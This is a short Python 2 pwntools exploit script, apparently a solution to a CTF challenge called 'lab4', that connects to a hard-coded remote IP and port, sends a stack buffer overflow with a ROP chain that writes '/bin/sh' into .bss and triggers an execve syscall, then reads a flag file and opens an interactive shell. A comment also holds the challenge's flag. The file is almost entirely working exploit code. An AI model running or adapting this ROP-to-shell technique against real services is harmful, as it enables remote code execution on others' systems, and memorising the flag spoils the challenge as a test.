#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{ZnkaWq9OU80usJjGUnax}

context.arch = 'amd64'

e = ELF('./lab4')

host , port = '35.194.234.201' , 2114

y = remote( host , port )

mv_rdi_rsi = 0x47a502
pop_rdi = 0x401456
ppr = 0x442809
pppr = 0x478516
syscall = 0x4671b5

p = flat(
    'D' * 0x28,
    ppr,
    0,
    '/bin/sh\x00',
    pop_rdi,
    e.bss(),
    mv_rdi_rsi,
    ppr,
    0,
    0,
    pppr,
    0x3b,
    0,
    0,
    syscall
)

y.sendafter( ':' , p )

y.sendline( 'cat ./flag.txt' )

y.interactive()

